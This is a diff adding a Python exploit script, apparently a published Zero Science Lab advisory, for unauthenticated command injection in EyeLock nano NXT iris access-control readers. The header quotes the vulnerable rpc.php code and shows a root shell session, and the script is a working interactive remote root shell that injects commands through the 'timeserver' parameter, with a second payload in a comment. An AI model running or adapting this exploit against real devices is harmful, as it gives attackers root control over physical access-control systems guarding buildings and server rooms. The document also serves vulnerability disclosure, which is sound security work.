@@ -1,0 +1,179 @@
+﻿#!/usr/bin/env python
+#
+#
+# EyeLock nano NXT 3.5 Remote Root Exploit
+#
+#
+# Vendor: EyeLock, LLC
+# Product web page: http://www.eyelock.com
+# Affected version: NXT Firmware: 3.05.1193 (ICM: 3.5.1)
+#                   NXT Firmware: 3.04.1108 (ICM: 3.4.13)
+#                   NXT Firmware: 3.03.944  (ICM: 3.3.2)
+#                   NXT Firmware: 3.01.646  (ICM: 3.1.13)
+#
+# Platform: Hardware (Biometric Iris Reader (master))
+#
+# EyeLock is an advanced iris authentication and recognition solutions company
+# focused on developing next-generation systems for global access control and identity
+# management.
+#
+# Summary: nano NXT® - the next generation of EyeLock’s revolutionary access
+# control solutions. nano NXT renders all other access control peripherals
+# obsolete by revolutionizing how identities are protected, authenticated,
+# and managed. With a sleek low profile and powerful capabilities, the nano
+# NXT redefines the future of access control. An optional SDK is available
+# to customers who want to customize their security solutions to integrate
+# seamlessly with existing applications. The nano NXT authenticates up to 20
+# people per minute, in-motion and at-a-distance with unparalleled accuracy.
+# nano NXT can be used in a variety of environments including commercial/enterprise,
+# corrections, data centers, education, financial services, government, healthcare
+# facilities and hospitality.
+#
+# Nano NXT is the most advanced compact iris-based identity authentication device
+# in Eyelock's comprehensive suite of end-to-end identity authentication solutions.
+# Nano NXT is a miniaturized iris-based recognition system capable of providing
+# real-time identification, both in-motion and at a distance. The Nano NXT is an
+# ideal replacement for card-based systems, and seamlessly controls access to turnstiles,
+# secured entrances, server rooms and any other physical space. Similarly the device
+# is powerful and compact enough to secure high-value transactions, critical databases,
+# network workstations or any other information system.
+#
+# Desc: EyeLock's nano NXT firmware latest version 3.5 (released 25.07.2016) suffers
+# from multiple unauthenticated command injection vulnerabilities. The issue lies
+# within the 'rpc.php' script located in the '/scripts' directory and can be triggered
+# when user supplied input is not correctly sanitized while updating the local time for
+# the device and/or get info from remote time server. The vulnerable script has two REQUEST
+# parameters 'timeserver' and 'localtime' that are called within a shell_exec() function
+# for setting the local time and the hardware clock of the device. An attacker can exploit
+# these conditions gaining full system (root) access and execute OS commands on the affected
+# device by injecting special characters to the affected parameters and further bypass
+# the access control in place.
+#
+# Hint: Plenty other RCE bugs are present in the rpc.php and others (like: uploadCertificate.php,
+# upgrade.php, WebConfig.php, firmwareupdate.php, interfaceeditor.php, etc.)
+#
+# =============================================================================
+# /scripts/rpc.php:
+# -----------------
+# 9:  if (isset($_REQUEST['action']))
+# 10: {
+# 11:    switch($_REQUEST['action'])
+# ...
+# ...
+# 181:        case 'updatetime':
+# 182:        {
+# 183:            // do something, the put our response in the response field...
+# 184:            $strDate = shell_exec("rdate -s {$_REQUEST['timeserver']} 2>&1");
+# 185:
+# 186:            // set the hardware clock.
+# 187:            $strResult = shell_exec("/sbin/hwclock -w"); // Does no harm to call this even on failure...
+# 188:
+# 189:            $strtheDate = shell_exec("date 2>&1");
+# 190:
+# 191:            echo "updatetime|{$strDate}|{$strtheDate}";
+# 192:
+# 193:            break;
+# 194:        }
+# 195:
+# 196:        case 'updatelocaltime':
+# 197:        {
+# 198:            // do something, the put our response in the response field...
+# 199:            $strDate = shell_exec("date -s '{$_REQUEST['localtime']}' 2>&1");
+# 200:
+# 201:            // set the hardware clock
+# 202:            $strResult = shell_exec("/sbin/hwclock -w"); // Does no harm to call this even on failure...
+# 203:
+# 204:            $strtheDate = shell_exec("date 2>&1");
+# 205:
+# 206:            echo "updatelocaltime|{$strDate}|{$strtheDate}";
+# 207:
+# 208:            break;
+# 209:        }
+# =============================================================================
+#
+# -----------------------------------------------------------------------------
+# Master: 192.168.40.1
+# Slave:  192.168.40.2
+#
+# $ eyelock.py 192.168.40.1
+#
+# root@192.168.40.1:~# id
+# uid=0(root) gid=0(root)
+#
+# root@192.168.40.1:~# cat /home/root/knockd.conf
+# [options]
+#	logfile = /var/log/knockd.log
+#
+# [openSSH]
+#	sequence    = 1973,1975,2013
+#	seq_timeout = 15
+#	command     = /usr/sbin/iptables -D INPUT -p tcp --dport 22 -j DROP
+#	tcpflags    = syn
+#
+# [closeSSH]
+#	sequence    = 91,85,70
+#	seq_timeout = 5
+#	command     = /usr/sbin/iptables -A INPUT -p tcp --dport 22 -j DROP
+#	tcpflags    = syn
+#
+#
+# root@192.168.40.1:~# exit
+#
+# $
+# -----------------------------------------------------------------------------
+#
+#
+# Tested on: GNU/Linux (armv7l)
+#            lighttpd/1.4.35
+#            SQLite/3.8.7.2
+#            PHP/5.6.6
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2016-5357
+# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5357.php
+#
+#
+# 10.06.2016
+#
+
+import re,sys,os
+import requests
+
+piton = os.path.basename(sys.argv[0])
+
+print '''
+---------------------------------------------------------
+EyeLock nano NXT <=3.5 [Open Sesame] Remote Root Exploit
+
+         Zero Science Lab - http://zeroscience.mk
+                      ZSL-2016-5357
+
+---------------------------------------------------------
+'''
+
+if len(sys.argv) < 2:
+	print '\n\x20\x20[*] Usage: '+piton+' <ipaddress>\n'
+	sys.exit()
+
+ipaddr = sys.argv[1]
+
+print
+while True:
+	try:
+		cmd = raw_input('root@'+ipaddr+':~# ')
+		# http://EyelockNxtMasterIP/scripts/rpc.php?action=updatelocaltime&localtime=%26whoami%26
+		execute = requests.get('http://'+ipaddr+'/scripts/rpc.php?action=updatetime&timeserver=||'+cmd)
+		pattern = re.compile(r'updatetime\|(.*?)\|',re.S|re.M)
+		cmdout = pattern.match(execute.text)
+		print cmdout.groups()[0].strip()
+		print
+		if cmd.strip() == 'exit':
+			break
+	except Exception:
+		break
+
+sys.exit()
